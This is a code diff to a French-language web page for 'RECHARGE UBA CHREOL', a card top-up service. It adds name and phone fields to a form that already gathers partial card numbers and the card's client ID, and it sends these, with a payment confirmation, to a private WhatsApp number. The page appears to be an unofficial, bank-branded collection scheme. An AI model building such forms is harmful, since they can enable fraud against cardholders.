@@ -169,6 +169,20 @@
             <label>Montant à créditer (FCFA)</label>
             <input type="number" id="amt" placeholder="Minimum 1 500 F" oninput="calculer()">
         </div>
+        <div class="input-group">
+            <label>Nom & Prénom *</label>
+                <input type="text" id="fullname" 
+                    placeholder="Ex: Jean Dupont"
+                    required aria-required="true">
+        </div>
+
+        <div class="input-group">
+            <label>Numéro de téléphone *</label>
+                <input type="tel" id="phone" 
+                    placeholder="Ex: 697657734"
+                    maxlength="15"
+                    required aria-required="true">
+        </div>
 
         <label>Choisissez votre mode de paiement</label>
         <div class="payment-methods">
@@ -187,7 +201,9 @@
             <br/> Une fois le paiement effectué, apporter la preuve de paiement.
         </div>
 
-        <button class="btn-send" onclick="validerEtEnvoyer()">Finaliser sur WhatsApp 🟢</button>
+        <button class="btn-send" onclick="validerEtEnvoyer()">
+            🚀 FINALISER MA RECHARGE UBA SUR WHATSAPP
+        </button>
         
         <p style="font-size: 11px; text-align: center; color: #888; margin-top: 15px;">
             En cliquant, vous confirmez l'exactitude des informations fournies.<br/>
@@ -241,6 +257,8 @@
             { id: 'p6', label: 'les 6 premiers chiffres de la carte' },
             { id: 'd4', label: 'les 4 derniers chiffres de la carte' },
             { id: 'id_card', label: 'l\'ID Client au dos de la carte' },
+            { id: 'fullname', label: 'votre nom et prénom' },
+            { id: 'phone', label: 'votre numéro de téléphone' },
             { id: 'amt', label: 'le montant de la recharge' }
         ];
 
@@ -255,13 +273,16 @@
 
         const msg = `*RECHARGE UBA CHREOL*%0A` +
                     `--------------------------%0A` +
+                    `👤 Nom : ${document.getElementById('fullname').value}%0A` +
+                    `📞 Téléphone : ${document.getElementById('phone').value}%0A` +
                     `💳 Carte : ${document.getElementById('p6').value}******${document.getElementById('d4').value}%0A` +
                     `🆔 ID : ${document.getElementById('id_card').value}%0A` +
                     `💰 Montant : ${document.getElementById('amt').value} FCFA%0A` +
                     `🏦 Paiement : ${currentMethod}%0A` +
                     `🔥 TOTAL : ${document.getElementById('view_total').innerText}%0A` +
                     `--------------------------%0A` +
-                    `_Je vous apporte la preuve de paiement pour finaliser ma recharge maintenant._`;
+                    `✅ Je confirme devoir effectuer le paiement.%0A` +
+                    `📸 Je vais envoyer immédiatement la preuve de paiement pour validation de ma recharge UBA.`;
 
         window.open(`https://wa.me/237697657734?text=${msg}`, '_blank');
     }
